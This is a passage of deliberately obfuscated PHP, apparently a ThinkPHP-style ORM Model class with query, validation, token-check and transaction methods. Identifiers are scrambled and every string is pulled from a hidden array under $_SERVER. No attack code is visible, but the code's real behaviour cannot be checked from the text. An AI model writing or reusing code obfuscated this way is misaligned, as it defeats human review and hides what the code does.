{ return null; } $this->_afterSelect($—úö¹¢ª, $àÇªƒıõ); return $—úö¹¢ª; } protected function _afterSelect(&$í’£ÛÂè, $…ÔÙëÛÛ) { } public function buildSql($³±¸¿‘• = array()) { $•ì²©ó =& $_SERVER[”ú…±Ú¥]; $³±¸¿‘• = $this->_parseOptions($³±¸¿‘•); return $•ì²©ó[315] . $this->db->buildSelectSql($³±¸¿‘•) . $•ì²©ó[316]; } public function optionsValue($‡Î¢’´Ö = null) { if (is_null($‡Î¢’´Ö)) { return $this->options; } elseif (is_array($‡Î¢’´Ö)) { $this->options = array_merge($this->options, $‡Î¢’´Ö); } } protected function _parseOptions($èÇÃŒÑÈ = array()) { $×¿ë¥½‘ =& $_SERVER[”ú…±Ú¥]; if (is_array($èÇÃŒÑÈ)) { $èÇÃŒÑÈ = array_merge($this->options, $èÇÃŒÑÈ); } $this->options = array(); if (!isset($èÇÃŒÑÈ[$×¿ë¥½‘[317]])) { $èÇÃŒÑÈ[$×¿ë¥½‘[317]] = $this->getTableName(); $ÁÅôáÀ£ = $this->fields; } else { $ÁÅôáÀ£ = $this->getDbFields(); } if (!empty($èÇÃŒÑÈ[$×¿ë¥½‘[318]])) { $èÇÃŒÑÈ[$×¿ë¥½‘[317]] .= $×¿ë¥½‘[53] . $èÇÃŒÑÈ[$×¿ë¥½‘[318]]; } $èÇÃŒÑÈ[$×¿ë¥½‘[319]] = $this->name; if (isset($èÇÃŒÑÈ[$×¿ë¥½‘[313]]) && is_array($èÇÃŒÑÈ[$×¿ë¥½‘[313]]) && !empty($ÁÅôáÀ£) && !isset($èÇÃŒÑÈ[$×¿ë¥½‘[320]]) && !isset($èÇÃŒÑÈ[$×¿ë¥½‘[317]])) { foreach ($èÇÃŒÑÈ[$×¿ë¥½‘[313]] as $ø¡Û”õ => $©ò˜»Íş) { $ø¡Û”õ = trim($ø¡Û”õ); if (in_array($ø¡Û”õ, $ÁÅôáÀ£, !0)) { if (is_scalar($©ò˜»Íş)) { $this->_parseType($èÇÃŒÑÈ[$×¿ë¥½‘[313]], $ø¡Û”õ); } } elseif (!is_numeric($ø¡Û”õ) && $×¿ë¥½‘[11] != substr($ø¡Û”õ, 0, 1) && !1 === strpos($ø¡Û”õ, $×¿ë¥½‘[10]) && !1 === strpos($ø¡Û”õ, $×¿ë¥½‘[298]) && !1 === strpos($ø¡Û”õ, $×¿ë¥½‘[321]) && !1 === strpos($ø¡Û”õ, $×¿ë¥½‘[322])) { unset($èÇÃŒÑÈ[$×¿ë¥½‘[313]][$ø¡Û”õ]); } } } $this->_options_filter($èÇÃŒÑÈ); return $èÇÃŒÑÈ; } protected function _options_filter(&$à©ÑÛ˜—) { } protected function _parseType(&$§şâàˆ, $¿‡ĞÑÆš) { $–±¤îş =& $_SERVER[”ú…±Ú¥]; if (empty($this->options[$–±¤îş[323]][$–±¤îş[4] . $¿‡ĞÑÆš])) { $‘êš¡¶„ = strtolower($this->fields[$–±¤îş[290]][$¿‡ĞÑÆš]); if (!1 !== strpos($‘êš¡¶„, $–±¤îş[324])) { } elseif (!1 === strpos($‘êš¡¶„, $–±¤îş[325]) && !1 !== strpos($‘êš¡¶„, $–±¤îş[326])) { $§şâàˆ[$¿‡ĞÑÆš] = intval($§şâàˆ[$¿‡ĞÑÆš]); } elseif (!1 !== strpos($‘êš¡¶„, $–±¤îş[327]) || !1 !== strpos($‘êš¡¶„, $–±¤îş[328])) { $§şâàˆ[$¿‡ĞÑÆš] = floatval($§şâàˆ[$¿‡ĞÑÆš]); } elseif (!1 !== strpos($‘êš¡¶„, $–±¤îş[329])) { $§şâàˆ[$¿‡ĞÑÆš] = (bool) $§şâàˆ[$¿‡ĞÑÆš]; } } } public function find($úË™¹â™ = array()) { $×øÀûş½ =& $_SERVER[”ú…±Ú¥]; if (is_numeric($úË™¹â™) || is_string($úË™¹â™)) { $û‹Öã”ô[$this->getPk()] = intval($úË™¹â™); $this->options[$×øÀûş½[313]] = $û‹Öã”ô; } $this->options[$×øÀûş½[330]] = 1; $úË™¹â™ = $this->_parseOptions(); $¹†‘¥—„ = $this->db->select($úË™¹â™); if (!1 === $¹†‘¥—„) { return !1; } if (empty($¹†‘¥—„)) { return null; } $this->data = $¹†‘¥—„[0]; $this->_afterFind($this->data, $úË™¹â™); if (!empty($this->options[$×øÀûş½[331]])) { return $this->returnResult($this->data, $this->options[$×øÀûş½[331]]); } return $this->data; } protected function _afterFind(&$˜Œî®†›, $ºò¸®™) { } protected function returnResult($²åëäÉ–, $ë­ëÌâÆ = '') { $ƒ‡µ¢Ìì =& $_SERVER[”ú…±Ú¥]; if ($ë­ëÌâÆ) { if (is_callable($ë­ëÌâÆ)) { return call_user_func($ë­ëÌâÆ, $²åëäÉ–); } switch (strtolower($ë­ëÌâÆ)) { case $ƒ‡µ¢Ìì[332]: return json_encode($²åëäÉ–); case $ƒ‡µ¢Ìì[333]: return xml_encode($²åëäÉ–); } } return $²åëäÉ–; } public function parseFieldsMap($ÙÄûÅÎò, $ßÒØ¥õş = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ôú‡’ŸŠ => $íİ–„”•) { if ($ßÒØ¥õş == 1) { if (isset($ÙÄûÅÎò[$íİ–„”•])) { $ÙÄûÅÎò[$ôú‡’ŸŠ] = $ÙÄûÅÎò[$íİ–„”•]; unset($ÙÄûÅÎò[$íİ–„”•]); } } else { if (isset($ÙÄûÅÎò[$ôú‡’ŸŠ])) { $ÙÄûÅÎò[$íİ–„”•] = $ÙÄûÅÎò[$ôú‡’ŸŠ]; unset($ÙÄûÅÎò[$ôú‡’ŸŠ]); } } } } return $ÙÄûÅÎò; } public function setField($ÎÑ™ŒŸØ, $™ÒÛ¬‡İ = '') { if (is_array($ÎÑ™ŒŸØ)) { $õŠâ‹ÚĞ = $ÎÑ™ŒŸØ; } else { $õŠâ‹ÚĞ[$ÎÑ™ŒŸØ] = $™ÒÛ¬‡İ; } return $this->save($õŠâ‹ÚĞ); } public function setAdd($¶ôú‡Ôã, $Õ‡£×ÆÜ = 1) { $Ìòğ¼·å =& $_SERVER[”ú…±Ú¥]; $‚™îŸ—  = $¶ôú‡Ôã . $Ìòğ¼·å[334] . $Õ‡£×ÆÜ; if ($Õ‡£×ÆÜ < 0) { $‚™îŸ—  = $¶ôú‡Ôã . $Õ‡£×ÆÜ; } return $this->setField($¶ôú‡Ôã, array($Ìòğ¼·å[335], $‚™îŸ— )); } public function getField($–¬ÌÕàÜ, $ôÓÌÈˆ• = null) { $§¶ë •ï =& $_SERVER[”ú…±Ú¥]; $óÁæ®óê[$§¶ë •ï[311]] = $–¬ÌÕàÜ; $óÁæ®óê = $this->_parseOptions($óÁæ®óê); $–¬ÌÕàÜ = trim($–¬ÌÕàÜ); if (strpos($–¬ÌÕàÜ, $§¶ë •ï[50])) { if (!isset($óÁæ®óê[$§¶ë •ï[330]])) { $óÁæ®óê[$§¶ë •ï[330]] = is_numeric($ôÓÌÈˆ•) ? $ôÓÌÈˆ• : $§¶ë •ï[12]; } $ûŸÆ¢ “ = $this->db->select($óÁæ®óê); if (!empty($ûŸÆ¢ “)) { $òÊ“½õá = explode($§¶ë •ï[50], $–¬ÌÕàÜ); $–¬ÌÕàÜ = array_keys($ûŸÆ¢ “[0]); $¨½ËÛ… = array_shift($–¬ÌÕàÜ); $±¿›á† = array_shift($–¬ÌÕàÜ); $”À™ºâ² = array(); $°Ÿ‹¤æ² = count($òÊ“½õá); foreach ($ûŸÆ¢ “ as $Ó”ùí˜¹) { $Èîì³ = $Ó”ùí˜¹[$¨½ËÛ…]; if (2 == $°Ÿ‹¤æ²) { $”À™ºâ²[$Èîì³] = $Ó”ùí˜¹[$±¿›á†]; } else { $”À™ºâ²[$Èîì³] = is_string($ôÓÌÈˆ•) ? implode($ôÓÌÈˆ•, $Ó”ùí˜¹) : $Ó”ùí˜¹; } } return $”À™ºâ²; } } else { if (!0 !== $ôÓÌÈˆ•) { $óÁæ®óê[$§¶ë •ï[330]] = is_numeric($ôÓÌÈˆ•) ? $ôÓÌÈˆ• : 1; } if ($ôÓÌÈˆ• === $§¶ë •ï[293]) { unset($óÁæ®óê[$§¶ë •ï[330]]); } $Ó”ùí˜¹ = $this->db->select($óÁæ®óê); if (!empty($Ó”ùí˜¹)) { if ($ôÓÌÈˆ• === $§¶ë •ï[293]) { return reset($Ó”ùí˜¹[0]); } if (!0 !== $ôÓÌÈˆ• && 1 == $óÁæ®óê[$§¶ë •ï[330]]) { return reset($Ó”ùí˜¹[0]); } foreach ($Ó”ùí˜¹ as $³Ğœ…½) { $´çËşù¶[] = $³Ğœ…½[$–¬ÌÕàÜ]; } return $´çËşù¶; } } return null; } public function create($ùô¿å¸ = '', $·´ÓöµÅ = '') { $‚¥Ù‘É =& $_SERVER[”ú…±Ú¥]; if (empty($ùô¿å¸)) { $ùô¿å¸ = $_POST; } elseif (is_object($ùô¿å¸)) { $ùô¿å¸ = get_object_vars($ùô¿å¸); } if (empty($ùô¿å¸) || !is_array($ùô¿å¸)) { $this->error = think_lang($‚¥Ù‘É[309]); return !1; } $ùô¿å¸ = $this->parseFieldsMap($ùô¿å¸, 0); $·´ÓöµÅ = $·´ÓöµÅ ? $·´ÓöµÅ : (!empty($ùô¿å¸[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‚¥Ù‘É[311]])) { $Ìà³˜ = $this->options[$‚¥Ù‘É[311]]; unset($this->options[$‚¥Ù‘É[311]]); } elseif ($·´ÓöµÅ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ìà³˜ = $this->insertFields; } elseif ($·´ÓöµÅ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ìà³˜ = $this->updateFields; } if (isset($Ìà³˜)) { if (is_string($Ìà³˜)) { $Ìà³˜ = explode($‚¥Ù‘É[50], $Ìà³˜); } if (think_config($‚¥Ù‘É[336])) { $Ìà³˜[] = think_config($‚¥Ù‘É[337]); } foreach ($ùô¿å¸ as $ïòÏô¶ä => $è´•Á) { if (!in_array($ïòÏô¶ä, $Ìà³˜)) { unset($ùô¿å¸[$ïòÏô¶ä]); } } } if (!$this->autoValidation($ùô¿å¸, $·´ÓöµÅ)) { return !1; } if (!$this->autoCheckToken($ùô¿å¸)) { $this->error = think_lang($‚¥Ù‘É[338]); return !1; } if ($this->autoCheckFields) { $Ìà³˜ = $this->getDbFields(); foreach ($ùô¿å¸ as $ïòÏô¶ä => $è´•Á) { if (!in_array($ïòÏô¶ä, $Ìà³˜)) { unset($ùô¿å¸[$ïòÏô¶ä]); } elseif (MAGIC_QUOTES_GPC && is_string($è´•Á)) { $ùô¿å¸[$ïòÏô¶ä] = stripslashes($è´•Á); } } } $this->autoOperation($ùô¿å¸, $·´ÓöµÅ); $this->data = $ùô¿å¸; return $ùô¿å¸; } public function autoCheckToken($úÅæœ¤À) { $ûÌ Ó½à =& $_SERVER[”ú…±Ú¥]; if (isset($this->options[$ûÌ Ó½à[339]]) && !$this->options[$ûÌ Ó½à[339]]) { return !0; } if (think_config($ûÌ Ó½à[336])) { $€Ï¥ı—Ã = think_config($ûÌ Ó½à[337]); if (!isset($úÅæœ¤À[$€Ï¥ı—Ã]) || Session::get($€Ï¥ı—Ã)) { return !1; } list($á®š‚å‘, $ùùÀĞà¤) = explode($ûÌ Ó½à[11], $úÅæœ¤À[$€Ï¥ı—Ã]); if ($ùùÀĞà¤ && Session::get($€Ï¥ı—Ã . $ûÌ Ó½à[10] . $á®š‚å‘) === $ùùÀĞà¤) { Session::remove($€Ï¥ı—Ã . $ûÌ Ó½à[10] . $á®š‚å‘); return !0; } if (think_config($ûÌ Ó½à[340])) { Session::remove($€Ï¥ı—Ã . $ûÌ Ó½à[10] . $á®š‚å‘); } return !1; } return !0; } public function regex($íÌ™’, $§ĞØ‹†¾) { $Ï²ûÍÊ =& $_SERVER[”ú…±Ú¥]; $…û»Ñ÷à = array($Ï²ûÍÊ[341] => $Ï²ûÍÊ[342], $Ï²ûÍÊ[343] => $Ï²ûÍÊ[344], $Ï²ûÍÊ[345] => $Ï²ûÍÊ[346], $Ï²ûÍÊ[347] => $Ï²ûÍÊ[348], $Ï²ûÍÊ[349] => $Ï²ûÍÊ[350], $Ï²ûÍÊ[351] => $Ï²ûÍÊ[352], $Ï²ûÍÊ[353] => $Ï²ûÍÊ[354], $Ï²ûÍÊ[328] => $Ï²ûÍÊ[355], $Ï²ûÍÊ[356] => $Ï²ûÍÊ[357]); if (isset($…û»Ñ÷à[strtolower($§ĞØ‹†¾)])) { $§ĞØ‹†¾ = $…û»Ñ÷à[strtolower($§ĞØ‹†¾)]; } return preg_match($§ĞØ‹†¾, $íÌ™’) === 1; } private function autoOperation(&$š¦²î‹·, $¥×ÚåşŠ) { $âÃ×İÉÃ =& $_SERVER[”ú…±Ú¥]; if (!empty($this->options[$âÃ×İÉÃ[358]])) { $Ã¢·°¢” = $this->options[$âÃ×İÉÃ[358]]; unset($this->options[$âÃ×İÉÃ[358]]); } elseif (!empty($this->_auto)) { $Ã¢·°¢” = $this->_auto; } if (isset($Ã¢·°¢”)) { foreach ($Ã¢·°¢” as $™‚¡Ğ‹Ö) { if (empty($™‚¡Ğ‹Ö[2])) { $™‚¡Ğ‹Ö[2] = THINK_MODEL_INSERT; } if ($¥×ÚåşŠ == $™‚¡Ğ‹Ö[2] || $™‚¡Ğ‹Ö[2] == THINK_MODEL_BOTH) { switch (trim($™‚¡Ğ‹Ö[3])) { case $âÃ×İÉÃ[359]: case $âÃ×İÉÃ[360]: $¡Ğœİ»† = isset($™‚¡Ğ‹Ö[4]) ? (array) $™‚¡Ğ‹Ö[4] : array(); if (isset($š¦²î‹·[$™‚¡Ğ‹Ö[0]])) { array_unshift($¡Ğœİ»†, $š¦²î‹·[$™‚¡Ğ‹Ö[0]]); } if ($âÃ×İÉÃ[359] == $™‚¡Ğ‹Ö[3]) { $š¦²î‹·[$™‚¡Ğ‹Ö[0]] = call_user_func_array($™‚¡Ğ‹Ö[1], $¡Ğœİ»†); } else { $š¦²î‹·[$™‚¡Ğ‹Ö[0]] = call_user_func_array(array(&$this, $™‚¡Ğ‹Ö[1]), $¡Ğœİ»†); } break; case $âÃ×İÉÃ[311]: $š¦²î‹·[$™‚¡Ğ‹Ö[0]] = $š¦²î‹·[$™‚¡Ğ‹Ö[1]]; break; case $âÃ×İÉÃ[361]: if ($âÃ×İÉÃ[12] === $š¦²î‹·[$™‚¡Ğ‹Ö[0]]) { unset($š¦²î‹·[$™‚¡Ğ‹Ö[0]]); } break; case $âÃ×İÉÃ[362]: default: $š¦²î‹·[$™‚¡Ğ‹Ö[0]] = $™‚¡Ğ‹Ö[1]; } if (!1 === $š¦²î‹·[$™‚¡Ğ‹Ö[0]]) { unset($š¦²î‹·[$™‚¡Ğ‹Ö[0]]); } } } } return $š¦²î‹·; } protected function autoValidation($ÓŞï­‚Ï, $– âÔº„) { $Ô¯³Ó =& $_SERVER[”ú…±Ú¥]; if (!empty($this->options[$Ô¯³Ó[363]])) { $æ›¥Ğ–Ì = $this->options[$Ô¯³Ó[363]]; unset($this->options[$Ô¯³Ó[363]]); } elseif (!empty($this->_validate)) { $æ›¥Ğ–Ì = $this->_validate; } if (isset($æ›¥Ğ–Ì)) { if ($this->patchValidate) { $this->error = array(); } foreach ($æ›¥Ğ–Ì as $ÉÁãØêÕ => $ù‹×ïıÊ) { if (empty($ù‹×ïıÊ[5]) || $ù‹×ïıÊ[5] == THINK_MODEL_BOTH || $ù‹×ïıÊ[5] == $– âÔº„) { if (0 == strpos($ù‹×ïıÊ[2], $Ô¯³Ó[364]) && strpos($ù‹×ïıÊ[2], $Ô¯³Ó[365])) { $ù‹×ïıÊ[2] = think_lang(substr($ù‹×ïıÊ[2], 2, -1)); } $ù‹×ïıÊ[3] = isset($ù‹×ïıÊ[3]) ? $ù‹×ïıÊ[3] : THINK_EXISTS_VALIDATE; $ù‹×ïıÊ[4] = isset($ù‹×ïıÊ[4]) ? $ù‹×ïıÊ[4] : $Ô¯³Ó[366]; switch ($ù‹×ïıÊ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÓŞï­‚Ï, $ù‹×ïıÊ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ô¯³Ó[12] != trim($ÓŞï­‚Ï[$ù‹×ïıÊ[0]])) { if (!1 === $this->_validationField($ÓŞï­‚Ï, $ù‹×ïıÊ)) { return !1; } } break; default: if (isset($ÓŞï­‚Ï[$ù‹×ïıÊ[0]])) { if (!1 === $this->_validationField($ÓŞï­‚Ï, $ù‹×ïıÊ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($‚éĞ†ú, $°ÜÇ½ç) { if (!1 === $this->_validationFieldItem($‚éĞ†ú, $°ÜÇ½ç)) { if ($this->patchValidate) { $this->error[$°ÜÇ½ç[0]] = $°ÜÇ½ç[2]; } else { $this->error = $°ÜÇ½ç[2]; return !1; } } return; } protected function _validationFieldItem($–”ßıëå, $â¦÷µó×) { $ÖÕ± ÒÒ =& $_SERVER[”ú…±Ú¥]; switch (strtolower(trim($â¦÷µó×[4]))) { case $ÖÕ± ÒÒ[359]: case $ÖÕ± ÒÒ[360]: $’èØ÷µé = isset($â¦÷µó×[6]) ? (array) $â¦÷µó×[6] : array(); if (is_string($â¦÷µó×[0]) && strpos($â¦÷µó×[0], $ÖÕ± ÒÒ[50])) { $â¦÷µó×[0] = explode($ÖÕ± ÒÒ[50], $â¦÷µó×[0]); } if (is_array($â¦÷µó×[0])) { foreach ($â¦÷µó×[0] as $§Şêı›Ê) { $ºÌ‚‚æ[$§Şêı›Ê] = $–”ßıëå[$§Şêı›Ê]; } array_unshift($’èØ÷µé, $ºÌ‚‚æ); } else { array_unshift($’èØ÷µé, $–”ßıëå[$â¦÷µó×[0]]); } if ($ÖÕ± ÒÒ[359] == $â¦÷µó×[4]) { return call_user_func_array($â¦÷µó×[1], $’èØ÷µé); } else { return call_user_func_array(array(&$this, $â¦÷µó×[1]), $’èØ÷µé); } case $ÖÕ± ÒÒ[367]: return $–”ßıëå[$â¦÷µó×[0]] == $–”ßıëå[$â¦÷µó×[1]]; case $ÖÕ± ÒÒ[368]: if (is_string($â¦÷µó×[0]) && strpos($â¦÷µó×[0], $ÖÕ± ÒÒ[50])) { $â¦÷µó×[0] = explode($ÖÕ± ÒÒ[50], $â¦÷µó×[0]); } $ØŸßÇÚ = array(); if (is_array($â¦÷µó×[0])) { foreach ($â¦÷µó×[0] as $§Şêı›Ê) { $ØŸßÇÚ[$§Şêı›Ê] = $–”ßıëå[$§Şêı›Ê]; } } else { $ØŸßÇÚ[$â¦÷µó×[0]] = $–”ßıëå[$â¦÷µó×[0]]; } if (!empty($–”ßıëå[$this->getPk()])) { $ØŸßÇÚ[$this->getPk()] = array($ÖÕ± ÒÒ[369], $–”ßıëå[$this->getPk()]); } if ($this->where($ØŸßÇÚ)->find()) { return !1; } return !0; default: return $this->check($–”ßıëå[$â¦÷µó×[0]], $â¦÷µó×[1], $â¦÷µó×[4]); } } public function check($İÁàÕş³, $ºƒ°î£, $­®¤æ¿é = "\x72\x65\147\x65\x78") { $ôÂ Ó×ë =& $_SERVER[”ú…±Ú¥]; $­®¤æ¿é = strtolower(trim($­®¤æ¿é)); switch ($­®¤æ¿é) { case $ôÂ Ó×ë[7]: case $ôÂ Ó×ë[370]: $Ç»©³„• = is_array($ºƒ°î£) ? $ºƒ°î£ : explode($ôÂ Ó×ë[50], $ºƒ°î£); return $­®¤æ¿é == $ôÂ Ó×ë[7] ? in_array($İÁàÕş³, $Ç»©³„•) : !in_array($İÁàÕş³, $Ç»©³„•); case $ôÂ Ó×ë[371]: case $ôÂ Ó×ë[372]: if (is_array($ºƒ°î£)) { $¹ö¶±şÄ = $ºƒ°î£[0]; $â¶‹ôû˜ = $ºƒ°î£[1]; } else { list($¹ö¶±şÄ, $â¶‹ôû˜) = explode($ôÂ Ó×ë[50], $ºƒ°î£); } return $­®¤æ¿é == $ôÂ Ó×ë[371] ? $İÁàÕş³ >= $¹ö¶±şÄ && $İÁàÕş³ <= $â¶‹ôû˜ : $İÁàÕş³ < $¹ö¶±şÄ || $İÁàÕş³ > $â¶‹ôû˜; case $ôÂ Ó×ë[373]: case $ôÂ Ó×ë[374]: return $­®¤æ¿é == $ôÂ Ó×ë[373] ? $İÁàÕş³ == $ºƒ°î£ : $İÁàÕş³ != $ºƒ°î£; case $ôÂ Ó×ë[375]: $Òƒ„–Åï = mb_strlen($İÁàÕş³, $ôÂ Ó×ë[376]); if (strpos($ºƒ°î£, $ôÂ Ó×ë[50])) { list($¹ö¶±şÄ, $â¶‹ôû˜) = explode($ôÂ Ó×ë[50], $ºƒ°î£); return $Òƒ„–Åï >= $¹ö¶±şÄ && $Òƒ„–Åï <= $â¶‹ôû˜; } else { return $Òƒ„–Åï == $ºƒ°î£; } case $ôÂ Ó×ë[377]: list($²ÂÅº¥ê, $‹ØşõÓ) = explode($ôÂ Ó×ë[50], $ºƒ°î£); if (!is_numeric($²ÂÅº¥ê)) { $²ÂÅº¥ê = strtotime($²ÂÅº¥ê); } if (!is_numeric($‹ØşõÓ)) { $‹ØşõÓ = strtotime($‹ØşõÓ); } return NOW_TIME >= $²ÂÅº¥ê && NOW_TIME <= $‹ØşõÓ; case $ôÂ Ó×ë[378]: return in_array(get_client_ip(), explode($ôÂ Ó×ë[50], $ºƒ°î£)); case $ôÂ Ó×ë[379]: return !in_array(get_client_ip(), explode($ôÂ Ó×ë[50], $ºƒ°î£)); case $ôÂ Ó×ë[366]: default: return $this->regex($İÁàÕş³, $ºƒ°î£); } } public function query($ŠŸíª½, $Ñ•Æ¨•Ã = false) { $ÒÔÜìòå =& $_SERVER[”ú…±Ú¥]; if (!is_bool($Ñ•Æ¨•Ã) && !is_array($Ñ•Æ¨•Ã)) { $Ñ•Æ¨•Ã = func_get_args(); array_shift($Ñ•Æ¨•Ã); } $ŠŸíª½ = str_replace(array($ÒÔÜìòå[191], $ÒÔÜìòå[380]), $ÒÔÜìòå[53], $ŠŸíª½); $ŠŸíª½ = $this->parseSql($ŠŸíª½, $Ñ•Æ¨•Ã); return $this->db->query($ŠŸíª½); } public function execute($ÅÍŞÊ¡, $ôÖ‹îÀ¹ = false) { if (!is_bool($ôÖ‹îÀ¹) && !is_array($ôÖ‹îÀ¹)) { $ôÖ‹îÀ¹ = func_get_args(); array_shift($ôÖ‹îÀ¹); } $ÅÍŞÊ¡ = $this->parseSql($ÅÍŞÊ¡, $ôÖ‹îÀ¹); return $this->db->execute($ÅÍŞÊ¡); } protected function parseSql($ôÙÑÍü¾, $‡ĞáÁõÈ) { $ªšÈ©í =& $_SERVER[”ú…±Ú¥]; if (!0 === $‡ĞáÁõÈ) { $ îšíúú = $this->_parseOptions(); $ôÙÑÍü¾ = $this->db->parseSql($ôÙÑÍü¾, $ îšíúú); } elseif (is_array($‡ĞáÁõÈ)) { $‡ĞáÁõÈ = array_map(array($this->db, $ªšÈ©í[381]), $‡ĞáÁõÈ); $ôÙÑÍü¾ = vsprintf($ôÙÑÍü¾, $‡ĞáÁõÈ); } else { $ôÙÑÍü¾ = strtr($ôÙÑÍü¾, array($ªšÈ©í[382] => $this->getTableName(), $ªšÈ©í[383] => think_config($ªšÈ©í[282]))); } $this->db->setModel($this->name); return $ôÙÑÍü¾; } public function db($–¹ô®ì£ = '', $Ô×‰‹ı­ = '', $øñìñ²Ì = array()) { $ë°ãŞÜ¯ =& $_SERVER[”ú…±Ú¥]; if ($ë°ãŞÜ¯[12] === $–¹ô®ì£ && $this->db) { return $this->db; } static $¹à¬Æ»ñ = array(); static $Ù¶Ã¬š™ = array(); if (!isset($Ù¶Ã¬š™[$–¹ô®ì£]) || isset($Ù¶Ã¬š™[$–¹ô®ì£]) && $Ô×‰‹ı­ && $¹à¬Æ»ñ[$–¹ô®ì£] != $Ô×‰‹ı­) { if (!empty($Ô×‰‹ı­) && is_string($Ô×‰‹ı­) && !1 === strpos($Ô×‰‹ı­, $ë°ãŞÜ¯[8])) { $Ô×‰‹ı­ = think_config($Ô×‰‹ı­); } $–¹ô®ì£ = think_guid($Ô×‰‹ı­); $Ù¶Ã¬š™[$–¹ô®ì£] = Db::getInstance($Ô×‰‹ı­); } elseif (NULL === $Ô×‰‹ı­) { $Ù¶Ã¬š™[$–¹ô®ì£]->close(); unset($Ù¶Ã¬š™[$–¹ô®ì£]); return; } if (!empty($øñìñ²Ì)) { if (is_string($øñìñ²Ì)) { parse_str($øñìñ²Ì, $øñìñ²Ì); } foreach ($øñìñ²Ì as $Ãû‡Şøœ => $Ì•Ø˜“) { $this->setProperty($Ãû‡Şøœ, $Ì•Ø˜“); } } $¹à¬Æ»ñ[$–¹ô®ì£] = $Ô×‰‹ı­; $this->db = $Ù¶Ã¬š™[$–¹ô®ì£]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $€œÜ±óÛ = get_class($this); if ($€œÜ±óÛ == $_SERVER[”ú…±Ú¥][384]) { return $this->name; } $this->name = substr($€œÜ±óÛ, 0, -5); } return $this->name; } public function getTableName() { $œôÜé =& $_SERVER[”ú…±Ú¥]; if (empty($this->trueTableName)) { $ûœ®ñ›º = !empty($this->tablePrefix) ? $this->tablePrefix : $œôÜé[12]; if (!empty($this->tableName)) { $ûœ®ñ›º .= $this->tableName; } else { $ûœ®ñ›º .= think_parse_name($this->name); } $this->trueTableName = strtolower($ûœ®ñ›º); } return (!empty($this->dbName) ? $this->dbName . $œôÜé[10] : $œôÜé[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $úàãÄÔã =& $_SERVER[”ú…±Ú¥]; return isset($this->fields[$úàãÄÔã[289]]) ? $this->fields[$úàãÄÔã[289]] : $this->pk; } public function getDbFields() { $ÏÅÒÉ‰ =& $_SERVER[”ú…±Ú¥]; if (isset($this->options[$ÏÅÒÉ‰[317]])) { $£†É€ó† = $this->db->getFields($this->options[$ÏÅÒÉ‰[317]]); return $£†É€ó† ? array_keys($£†É€ó†) : !1; } if ($this->fields) { $£†É€ó† = $this->fields; unset($£†É€ó†[$ÏÅÒÉ‰[288]], $£†É€ó†[$ÏÅÒÉ‰[289]], $£†É€ó†[$ÏÅÒÉ‰[290]], $£†É€ó†[$ÏÅÒÉ‰[287]]); return $£†É€ó†; } return !1; } public function data($¸Š¾ÓÒ = '') { $Çåû„¹ =& $_SERVER[”ú…±Ú¥]; if ($Çåû„¹[12] === $¸Š¾ÓÒ && !empty($this->data)) { return $this->data; } if (is_object($¸Š¾ÓÒ)) { $¸Š¾ÓÒ = get_object_vars($¸Š¾ÓÒ); } elseif (is_string($¸Š¾ÓÒ)) { parse_str($¸Š¾ÓÒ, $¸Š¾ÓÒ); } elseif (!is_array($¸Š¾ÓÒ)) { think_exception(think_lang($Çåû„¹[309])); } $this->data = $¸Š¾ÓÒ; return $this; } public function join($õİãåêÃ) { $“êŞ‰Í» =& $_SERVER[”ú…±Ú¥]; if (is_array($õİãåêÃ)) { $this->options[$“êŞ‰Í»[320]] = $õİãåêÃ; } elseif (!empty($õİãåêÃ)) { $this->options[$“êŞ‰Í»[320]][] = $õİãåêÃ; } return $this; } public function union($İáµÁ²ú, $ªÂ¤ùÒ‡ = false) { $†£íæ»Ş =& $_SERVER[”ú…±Ú¥]; if (empty($İáµÁ²ú)) { return $this; } if ($ªÂ¤ùÒ‡) { $this->options[$†£íæ»Ş[385]][$†£íæ»Ş[386]] = !0; } if (is_object($İáµÁ²ú)) { $İáµÁ²ú = get_object_vars($İáµÁ²ú); } if (is_string($İáµÁ²ú)) { $¡ëœ–á = $İáµÁ²ú; } elseif (is_array($İáµÁ²ú)) { if (isset($İáµÁ²ú[0])) { $this->options[$†£íæ»Ş[385]] = array_merge($this->options[$†£íæ»Ş[385]], $İáµÁ²ú); return $this; } else { $¡ëœ–á = $İáµÁ²ú; } } else { think_exception(think_lang($†£íæ»Ş[309])); } $this->options[$†£íæ»Ş[385]][] = $¡ëœ–á; return $this; } public function cache($·éÎ¢í‘ = true, $Ô½Ø§âû = null, $íéóê = '') { $¶ïªºıÀ =& $_SERVER[”ú…±Ú¥]; if (!1 !== $·éÎ¢í‘) { $this->options[$¶ïªºıÀ[387]] = array($¶ïªºıÀ[94] => $·éÎ¢í‘, $¶ïªºıÀ[377] => $Ô½Ø§âû, $¶ïªºıÀ[33] => $íéóê); } return $this; } public function field($ĞÁôƒÄ, $’³­Šûƒ = false) { $ÅŒ¢„´ =& $_SERVER[”ú…±Ú¥]; if (!0 === $ĞÁôƒÄ) { $ËÜôòà¸ = $this->getDbFields(); $ĞÁôƒÄ = $ËÜôòà¸ ? $ËÜôòà¸ : $ÅŒ¢„´[199]; } elseif ($’³­Šûƒ) { if (is_string($ĞÁôƒÄ)) { $ĞÁôƒÄ = explode($ÅŒ¢„´[50], $ĞÁôƒÄ); } $ËÜôòà¸ = $this->getDbFields(); $ĞÁôƒÄ = $ËÜôòà¸ ? array_diff($ËÜôòà¸, $ĞÁôƒÄ) : $ĞÁôƒÄ; } $this->options[$ÅŒ¢„´[311]] = $ĞÁôƒÄ; return $this; } public function scope($÷Ü¬ÆĞÅ = '', $òŞ½¡Ä = NULL) { $ğ³”ÌÁÇ =& $_SERVER[”ú…±Ú¥]; if 